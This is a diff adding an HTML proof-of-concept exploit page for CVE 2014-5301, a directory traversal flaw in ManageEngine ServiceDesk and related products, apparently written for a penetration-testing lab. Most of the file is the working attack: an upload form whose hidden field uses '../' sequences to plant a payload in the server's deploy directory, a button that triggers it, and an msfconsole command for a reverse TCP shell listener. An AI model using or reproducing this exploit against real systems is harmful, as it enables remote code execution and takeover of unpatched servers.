@@ -1,0 +1,56 @@
+<html>
+<head></head>
+<body bgcolor="black">
+
+<!--
+Wrote this quick HTML page for exploit CVE 2014-5301 until
+I finished my python exploit. Wrote mostly this as PoC
+so I know what to write in python later.
+// nighter@nighter.se
+-->
+
+<style>
+body{
+color: lime;
+}
+</style>
+
+<h1>CVE 2014-5301</h1>
+
+This module exploits a directory traversal vulnerability in ManageEngine<br/>
+ServiceDesk, AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts the upload<br/>
+does not handle correctly '../' sequences, which can be abused to write to the file system. Authentication is needed to<br/>
+exploit this vulnerability, but this module will attempt to login using the default credentials for the administrator<br/>
+and guest accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.<br/>
+For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All versions of ServiceDesk<br/>
+prior v9 build 9031 (including MSP but excluding v4), AssetExplorer, SupportCenter and IT360 (including MSP) are vulnerable.<br/>
+At the time of release of this module, only ServiceDesk v9 has been fixed in build 9031 and above.<br/>
+This module has been been tested successfully in Windows and Linux on several versions.
+
+<br/><br/>
+First login in ManageEngine then use this form in the same browser.
+<br/><br/>
+<hr/>
+<b>Upload the payload generated from build_ear.py here</b>
+<br/><br/>
+
+<form action="http://10.11.1.xxx:8080/common/FileAttachment.jsp" method="post" enctype="multipart/form-data" id="jsform">
+    <input type='hidden' name='module' value='../../server/default/deploy'>
+    <input type="file" name="filename" id="filename" />
+    <input type="hidden" name="att_desc" />
+</form>
+
+<input type='button' value='send_payload' onclick=document.getElementById('jsform').submit();>
+
+
+<br/><br/>
+<hr/>
+
+<pre>Start listener and execute payload by type the payload_name (eg: FsGFJCVU)</pre>
+<pre><i>msfconsole -x 'use multi/handler;set PAYLOAD java/shell/reverse_tcp;set LHOST 10.11.0.xxx;set LPORT 4444;run'</i></pre>
+
+<input type="text" id="payload_name"><br/>
+<input type="button" value="trigger" onclick="location.href='http://10.11.1.xxx:8080/'+document.getElementById('payload_name').value;">
+
+</body>
+</html>
